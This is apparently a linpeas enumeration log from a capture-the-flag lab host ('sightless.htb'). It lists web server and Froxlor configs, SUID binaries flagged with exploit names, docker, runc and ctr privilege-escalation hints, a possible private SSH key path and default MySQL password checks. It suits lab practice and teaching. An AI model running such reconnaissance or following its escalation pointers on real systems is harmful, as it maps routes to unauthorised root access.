 21:21:53 up 1 day, 22:12,  1 user,  load average: 0.75, 0.34, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
michael  pts/0    10.10.14.46      21:16    1:57   0.22s  0.00s /bin/sh ./linpeas.sh

╔══════════╣ Last logons
michael  pts/0        Thu Jan  9 02:45:52 2025 - Thu Jan  9 02:47:23 2025  (00:01)     10.10.14.52
reboot   system boot  Wed Jan  8 23:09:18 2025   still running                         0.0.0.0
michael  pts/0        Tue Sep  3 11:52:02 2024 - Tue Sep  3 11:55:10 2024  (00:03)     10.10.14.23
reboot   system boot  Tue Sep  3 11:51:24 2024 - Tue Sep  3 11:55:22 2024  (00:03)     0.0.0.0
root     tty1         Tue Sep  3 08:18:45 2024 - down                      (00:14)     0.0.0.0
reboot   system boot  Tue Sep  3 08:18:23 2024 - Tue Sep  3 08:33:02 2024  (00:14)     0.0.0.0
root     pts/0        Fri Aug  9 11:29:49 2024 - down                      (00:04)     10.10.14.23
reboot   system boot  Fri Aug  9 11:29:29 2024 - Fri Aug  9 11:34:15 2024  (00:04)     0.0.0.0

wtmp begins Fri Aug  9 11:29:29 2024

╔══════════╣ Last time logon each user
Username         Port     From             Latest
root             tty1                      Tue Sep  3 08:18:45 +0000 2024
michael          pts/0    10.10.14.46      Fri Jan 10 21:16:00 +0000 2025

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/sbin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.52 (Ubuntu)
Server built:   2024-07-17T18:57:26
httpd Not Found

Nginx version: 
/etc/apache2/mods-enabled/php8.1.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php8.1.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php8.1.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php8.1.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-available/php8.1.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php8.1.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php8.1.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php8.1.conf:    SetHandler application/x-httpd-php-source
══╣ Nginx modules
ngx_http_geoip2_module.so
ngx_http_image_filter_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_geoip2_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Jan 10 07:25 /etc/apache2/sites-enabled
drwxr-xr-x 2 root root 4096 Jan 10 07:25 /etc/apache2/sites-enabled
-rw-r--r-- 1 root root 770 Jan 10 07:25 /etc/apache2/sites-enabled/10_froxlor_ipandport_192.168.1.118.80.conf
<VirtualHost 192.168.1.118:80>
DocumentRoot "/var/www/html/froxlor"
 ServerName admin.sightless.htb
  <Directory "/lib/">
    <Files "userdata.inc.php">
    Require all denied
    </Files>
  </Directory>
  <DirectoryMatch "^/(bin|cache|logs|tests|vendor)/">
    Require all denied
  </DirectoryMatch>
  <FilesMatch \.(php)$>
    <If "-f %{SCRIPT_FILENAME}">
  	SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-froxlor.panel-admin.sightless.htb-php-fpm.socket|fcgi://localhost
    </If>
  </FilesMatch>
  <Directory "/var/www/html/froxlor/">
      CGIPassAuth On
  </Directory>
</VirtualHost>
-rw-r--r-- 1 root root 887 Jan 10 07:25 /etc/apache2/sites-enabled/34_froxlor_normal_vhost_web1.sightless.htb.conf
<VirtualHost 192.168.1.118:80>
  ServerName web1.sightless.htb
  ServerAlias *.web1.sightless.htb
  ServerAdmin john@sightless.htb
  DocumentRoot "/var/customers/webs/web1"
  <Directory "/var/customers/webs/web1/">
  <FilesMatch \.(php)$>
    <If "-f %{SCRIPT_FILENAME}">
      SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-web1-web1.sightless.htb-php-fpm.socket|fcgi://localhost
    </If>
  </FilesMatch>
    CGIPassAuth On
    Require all granted
    AllowOverride All
  </Directory>
  Alias /goaccess "/var/customers/webs/web1/goaccess"
  LogLevel warn
  ErrorLog "/tmp/web1-error.log"
  CustomLog "/tmp/web1-access.log" combined
</VirtualHost>
-rw-r--r-- 1 root root 1480 Aug  2 09:05 /etc/apache2/sites-enabled/002-sqlpad.conf
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName sqlpad.sightless.htb
	ServerAlias sqlpad.sightless.htb
	ProxyPreserveHost On
	ProxyPass         / http://127.0.0.1:3000/
	ProxyPassReverse  / http://127.0.0.1:3000/
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
-rw-r--r-- 1 root root 264 Jan 10 07:25 /etc/apache2/sites-enabled/05_froxlor_dirfix_nofcgid.conf
  <Directory "/var/customers/webs/">
    Require all granted
    AllowOverride All
  </Directory>
lrwxrwxrwx 1 root root 35 May 15  2024 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
-rw-r--r-- 1 root root 412 Jan 10 07:25 /etc/apache2/sites-enabled/40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf
<Directory "/var/customers/webs/web1/goaccess/">
  AuthType Basic
  AuthName "Restricted Area"
  AuthUserFile /etc/apache2/froxlor-htpasswd/1-666d99c49b2986e75ed93e591b7eb6c8.htpasswd
  require valid-user
</Directory>

drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/nginx/sites-enabled
drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 May 21  2024 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
    listen *:80;
    server_name sightless.htb;
    location / {
        root /var/www/sightless;
        index index.html;
    }
    if ($host != sightless.htb) {
        rewrite ^ http://sightless.htb/;
    }
}
-rw-r--r-- 1 root root 249 Aug  9 07:18 /etc/nginx/sites-enabled/main
server {
	listen 80;
	server_name sqlpad.sightless.htb;
	location / {
		proxy_pass http://localhost:3000;
		proxy_set_header Host $host;
		proxy_set_header X-Real-IP $remote_addr;
		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
	}
}


-rw-r--r-- 1 root root 1414 Aug  9 07:04 /etc/apache2/sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 May 15  2024 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html/froxlor
	ServerName admin.sightless.htb
	ServerAlias admin.sightless.htb
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72928 May  1  2024 /etc/php/8.1/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72924 May  1  2024 /etc/php/8.1/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72928 May  1  2024 /etc/php/8.1/phpdbg/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On

-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 May 30  2023 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 May 30  2023 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 May 30  2023 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Aug  9 11:17 /etc/nginx
-rw-r--r-- 1 root root 1447 May 30  2023 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
	worker_connections 768;
}
http {
	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	include /etc/nginx/mime.types;
	default_type application/octet-stream;
	ssl_prefer_server_ciphers on;
	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;
	gzip on;
	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}
-rw-r--r-- 1 root root 423 May 30  2023 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
-rw-r--r-- 1 root root 217 May 30  2023 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
lrwxrwxrwx 1 root root 48 Aug  9 10:56 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 60 Aug  9 10:56 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 55 Aug  9 10:56 /etc/nginx/modules-enabled/50-mod-http-geoip2.conf -> /usr/share/nginx/modules-available/mod-http-geoip2.conf
load_module modules/ngx_http_geoip2_module.so;
lrwxrwxrwx 1 root root 57 Aug  9 10:56 /etc/nginx/modules-enabled/70-mod-stream-geoip2.conf -> /usr/share/nginx/modules-available/mod-stream-geoip2.conf
load_module modules/ngx_stream_geoip2_module.so;
lrwxrwxrwx 1 root root 61 Aug  9 10:56 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
lrwxrwxrwx 1 root root 50 Aug  9 10:56 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 1125 May 30  2023 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  REMOTE_USER        $remote_user;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;

-rw-r--r-- 1 root root 374 May 30  2023 /etc/ufw/applications.d/nginx

drwxr-xr-x 3 root root 4096 Aug  9 11:17 /usr/lib/nginx

-rwxr-xr-x 1 root root 1240136 May 30  2023 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Aug  9 11:17 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Aug  9 11:17 /usr/share/nginx
-rw-r--r-- 1 root root 42 May 30  2023 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 52 May 30  2023 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 40 May 30  2023 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 53 May 30  2023 /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
-rw-r--r-- 1 root root 47 May 30  2023 /usr/share/nginx/modules-available/mod-http-geoip2.conf
load_module modules/ngx_http_geoip2_module.so;
-rw-r--r-- 1 root root 49 May 30  2023 /usr/share/nginx/modules-available/mod-stream-geoip2.conf
load_module modules/ngx_stream_geoip2_module.so;

drwxr-xr-x 7 root root 4096 May 21  2024 /var/lib/nginx
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied

drwxr-xr-x 2 root adm 4096 Jan 10 00:00 /var/log/nginx


╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html#docker-breakout--privilege-escalation
lrwxrwxrwx 1 root root 33 May 15  2024 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 171 Jan 15  2024 /usr/lib/systemd/system/docker.socket
-rw-r--r-- 1 root root 0 May 15  2024 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Aug  9 10:32 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Oct 11  2022 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/pam.d
-rw-r--r-- 1 root root 2135 May 17  2024 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug  9 11:17 /etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Sep  3 08:19 /usr/share/keyrings


╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1055 May 30  2023 /etc/nginx/fastcgi_params

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 761 Nov 15  2021 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
-rw-r--r-- 1 root root 5922 May 15  2024 /etc/vsftpd.conf
anonymous_enable=YES
local_enable
#write_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#chown_uploads=YES
#chown_username=whoever
anon_root=/var/ftp/


-rw-r--r-- 1 root root 69 May  1  2024 /etc/php/8.1/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jun 14  2024 /usr/share/php8.1-common/common/ftp.ini


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 826 Nov 15  2021 /usr/share/bash-completion/completions/bind


╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 www-data adm 143872074 Jan 10 20:59 /var/log/nginx/access.log

-rw-r----- 1 www-data adm 296620146 Jan 10 06:54 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Jan  6  2022 /etc/skel/.bashrc
-rw-r--r-- 1 michael michael 3771 Jan  6  2022 /home/michael/.bashrc


-rw-r--r-- 1 root root 807 Jan  6  2022 /etc/skel/.profile
-rw-r--r-- 1 michael michael 807 Jan  6  2022 /home/michael/.profile


╔══════════╣ Analyzing Windows Files (limit 70)


lrwxrwxrwx 1 root root 20 May 15  2024 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 May 15  2024 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Aug  9 10:32 /var/lib/dpkg/alternatives/my.cnf


╔══════════╣ Analyzing FreeIPA Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep  3 08:21 /usr/src/linux-headers-5.15.0-119/drivers/net/ipa


╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ MySQL version
mysql  Ver 8.0.39-0ubuntu0.22.04.1 for Linux on x86_64 ((Ubuntu))


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 11106 Jan 10 06:25 /etc/apt/trusted.gpg.d/google-chrome.gpg
-rw-r--r-- 1 root root 2794 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 michael michael 1200 Jan  9 16:54 /home/michael/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 2899 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 3023 Mar 26  2021 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2275 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
-rw-r--r-- 1 root root 2250 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Jun 17  2024 /usr/share/keyrings/ubuntu-pro-ros.gpg

drwx------ 3 michael michael 4096 Jan 10 21:21 /home/michael/.gnupg

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#runc--privilege-escalation
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
passwd file: /var/lib/extrausers/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)


-rw-r--r-- 1 michael michael 284 Jan 10 03:26 /home/michael/.ssh/known_hosts
|1|EPxFH5iyFf05s5itNV9KriO5Us0=|6HhTW8NKJRwlDwAUSiyEHdQ6ZTU= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
|1|H8ltNh/JXBzhTWtYLFNUXu/jh2k=|TEbVi4uzqYZZsDgok6RciuI1HSE= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu


-rw------- 1 michael michael 0 May 15  2024 /home/michael/.ssh/authorized_keys

-rw-r--r-- 1 root root 604 May 15  2024 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 176 May 15  2024 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 96 May 15  2024 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 568 May 15  2024 /etc/ssh/ssh_host_rsa_key.pub

UsePAM yes

══╣ Possible private SSH keys were found!
/home/michael/X1yYwHsO

══╣ Some certificates were found (out limited):
/etc/pki/fwupd/LVFS-CA.pem
/etc/pki/fwupd-metadata/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068_2.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
122870PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions
tmux 3.2a


/tmp/tmux-1000


                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 208K May 14  2024 /opt/google/chrome/chrome-sandbox
-rwsr-xr-x 1 root root 47K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35K Mar 23  2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 35K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 19K Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 331K Jun 26  2024 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 35K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root _ssh 287K Jun 26  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 39K Mar 23  2022 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 27K Jan 10  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 15K Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls
files with acls in searched folders Not Found

╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

╚ Parent process capabilities
CapInh:	 0x0000000000000000=
